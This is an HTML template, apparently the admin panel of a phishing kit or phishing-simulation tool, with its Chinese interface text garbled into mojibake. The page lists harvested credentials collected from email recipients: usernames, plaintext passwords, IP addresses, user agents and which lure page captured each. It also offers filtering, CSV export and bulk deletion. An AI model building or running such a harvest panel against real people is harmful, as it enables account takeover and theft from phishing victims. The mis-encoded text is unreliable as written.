<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>å‡­è¯ç®¡ç†ç³»ç»Ÿ</title>
	<style>
		* {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}
		
		body {
			background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
			font-family: 'Segoe UI', 'PingFang SC', 'Hiragino Sans GB', Arial, sans-serif;
			min-height: 100vh;
			padding: 20px;
		}
		
		.container {
			max-width: 1200px;
			margin: 0 auto;
		}
		
		.header {
			text-align: center;
			color: white;
			margin-bottom: 40px;
		}
		
		.header h1 {
			font-size: 36px;
			font-weight: 600;
			margin-bottom: 8px;
		}
		
		.header p {
			font-size: 16px;
			opacity: 0.9;
		}
		
		.stats-grid {
			display: grid;
			grid-template-columns: 1fr 1fr;
			gap: 30px;
			margin-bottom: 40px;
		}
		
		.stat-card {
			background: rgba(255, 255, 255, 0.15);
			backdrop-filter: blur(10px);
			border-radius: 20px;
			padding: 30px;
			text-align: center;
			border: 1px solid rgba(255, 255, 255, 0.2);
		}
		
		.stat-card h3 {
			color: white;
			font-size: 18px;
			margin-bottom: 10px;
			opacity: 0.9;
		}
		
		.stat-card .number {
			color: white;
			font-size: 48px;
			font-weight: bold;
		}
		
		.main-card {
			background: rgba(255, 255, 255, 0.95);
			border-radius: 20px;
			padding: 30px;
			box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
		}
		
		.section-title {
			font-size: 24px;
			font-weight: 600;
			color: #333;
			text-align: center;
			margin-bottom: 30px;
		}
		
		.search-bar {
			display: flex;
			gap: 15px;
			margin-bottom: 20px;
			align-items: center;
			flex-wrap: wrap;
		}
		
		.search-bar input {
			padding: 10px 15px;
			border: 2px solid #e2e8f0;
			border-radius: 8px;
			font-size: 14px;
			transition: all 0.2s;
		}
		
		.search-bar input:focus {
			outline: none;
			border-color: #667eea;
			box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
		}
		
		.btn {
			padding: 10px 20px;
			border: none;
			border-radius: 8px;
			font-size: 14px;
			font-weight: 500;
			cursor: pointer;
			transition: all 0.2s;
			text-decoration: none;
			display: inline-flex;
			align-items: center;
			gap: 6px;
		}
		
		.btn-primary {
			background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
			color: white;
		}
		
		.btn-primary:hover {
			transform: translateY(-2px);
			box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
		}
		
		.btn-secondary {
			background: #6b7280;
			color: white;
		}
		
		.btn-secondary:hover {
			background: #4b5563;
		}
		
		.btn-danger {
			background: #ef4444;
			color: white;
		}
		
		.btn-danger:hover {
			background: #dc2626;
		}
		
		.table-container {
			background: white;
			border-radius: 12px;
			overflow: hidden;
			box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
			margin-bottom: 20px;
		}
		
		.data-table {
			width: 100%;
			border-collapse: collapse;
		}
		
		.data-table thead {
			background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
		}
		
		.data-table th {
			color: white;
			font-weight: 600;
			padding: 16px 12px;
			text-align: left;
			font-size: 14px;
		}
		
		.data-table td {
			padding: 14px 12px;
			border-bottom: 1px solid #f1f5f9;
			font-size: 13px;
			color: #334155;
		}
		
		.data-table tr:hover {
			background-color: #f8fafc;
		}
		
		.data-table tr:last-child td {
			border-bottom: none;
		}
		
		.empty-state {
			text-align: center;
			padding: 60px 20px;
			color: #64748b;
		}
		
		.empty-icon {
			font-size: 48px;
			margin-bottom: 16px;
			opacity: 0.6;
		}
		
		.empty-text {
			font-size: 16px;
			font-weight: 500;
			margin-bottom: 8px;
		}
		
		.empty-desc {
			font-size: 14px;
			opacity: 0.8;
		}
		
		.checkbox {
			width: 16px;
			height: 16px;
			accent-color: #667eea;
		}
		
		.text-truncate {
			max-width: 200px;
			white-space: nowrap;
			overflow: hidden;
			text-overflow: ellipsis;
		}
		
		@media (max-width: 768px) {
			.stats-grid {
				grid-template-columns: 1fr;
				gap: 20px;
			}
			
			.search-bar {
				flex-direction: column;
				align-items: stretch;
			}
			
			.main-card {
				padding: 20px;
				margin: 0 10px;
			}
			
			.data-table {
				font-size: 12px;
			}
			
			.data-table th,
			.data-table td {
				padding: 10px 8px;
			}
		}
	</style>
</head>

<body>
	<div class="container">
		<!-- å¤´éƒ¨æ ‡é¢˜ -->
		<div class="header">
			<h1>å‡­è¯ç®¡ç†ç³»ç»Ÿ</h1>
			<p>æŸ¥çœ‹å’Œç®¡ç†æ”¶é›†çš„ç”¨æˆ·å‡­è¯ä¿¡æ¯</p>
		</div>
		
		<!-- ç»Ÿè®¡å¡ç‰‡ -->
		<div class="stats-grid">
			<div class="stat-card">
				<h3>å‡­è¯æ€»æ•°</h3>
				<div class="number">{{ cred_count }}</div>
			</div>
			<div class="stat-card">
				<h3>æ”¶ä¿¡äººæ€»æ•°</h3>
				<div class="number">{{ emp_count }}</div>
			</div>
		</div>
		
		<!-- ä¸»è¦å†…å®¹å¡ç‰‡ -->
		<div class="main-card">
			<h2 class="section-title">å‡­è¯åˆ—è¡¨</h2>
			
			<!-- æœç´¢æ  -->
			<form method="get" class="search-bar">
				<input type="text" name="username" value="{{ username }}" placeholder="ç”¨æˆ·å" style="width: 120px;">
				<input type="text" name="ip" value="{{ ip }}" placeholder="IPåœ°å€" style="width: 120px;">
				<input type="text" name="scene" value="{{ scene }}" placeholder="é¡µé¢æ ‡è¯†" style="width: 120px;">
				<button type="submit" class="btn btn-primary">ğŸ” ç­›é€‰</button>
				<a href="{{ url_for('admin.creds_export') }}" class="btn btn-secondary">ğŸ“Š å¯¼å‡ºCSV</a>
			</form>
			
			<!-- æ•°æ®è¡¨æ ¼ -->
			<form method="post" onsubmit="return confirm('ç¡®å®šè¦åˆ é™¤é€‰ä¸­é¡¹å—ï¼Ÿ');">
				<input type="hidden" name="action" value="delete">
				
				{% if creds %}
				<div class="table-container">
					<table class="data-table">
						<thead>
							<tr>
								<th style="width: 50px;">
									<input type="checkbox" class="checkbox" onclick="var cbs=document.querySelectorAll('[name=delete_ids]');for(var i=0;i<cbs.length;i++)cbs[i].checked=this.checked;">
								</th>
								<th>ID</th>
								<th>ç”¨æˆ·å</th>
								<th>æ˜æ–‡å¯†ç </th>
								<th>IPåœ°å€</th>
								<th>æ—¶é—´</th>
								<th>é¡µé¢æ ‡è¯†</th>
								<th>User-Agent</th>
								<th>æ‰©å±•ä¿¡æ¯</th>
							</tr>
						</thead>
						<tbody>
							{% for cred in creds %}
							<tr>
								<td>
									<input type="checkbox" name="delete_ids" value="{{ cred.id }}" class="checkbox">
								</td>
								<td>{{ cred.id }}</td>
								<td>{{ cred.username }}</td>
								<td>{{ cred.raw_password }}</td>
								<td>{{ cred.ip }}</td>
								<td>{{ cred.timestamp }}</td>
								<td>{{ cred.scene }}</td>
								<td class="text-truncate" title="{{ cred.user_agent }}">{{ cred.user_agent }}</td>
								<td class="text-truncate" title="{{ cred.extra_info }}">{{ cred.extra_info }}</td>
							</tr>
							{% endfor %}
						</tbody>
					</table>
				</div>
				
				<button type="submit" class="btn btn-danger">ğŸ—‘ï¸ æ‰¹é‡åˆ é™¤</button>
				{% else %}
				<!-- ç©ºçŠ¶æ€ -->
				<div class="empty-state">
					<div class="empty-icon">ğŸ—‚ï¸</div>
					<div class="empty-text">æš‚æ— æ•°æ®</div>
					<div class="empty-desc">å½“å‰ç­›é€‰æ¡ä»¶ä¸‹æ²¡æœ‰æ‰¾åˆ°ç›¸å…³è®°å½•</div>
				</div>
				{% endif %}
			</form>
		</div>
	</div>
</body>
</html>
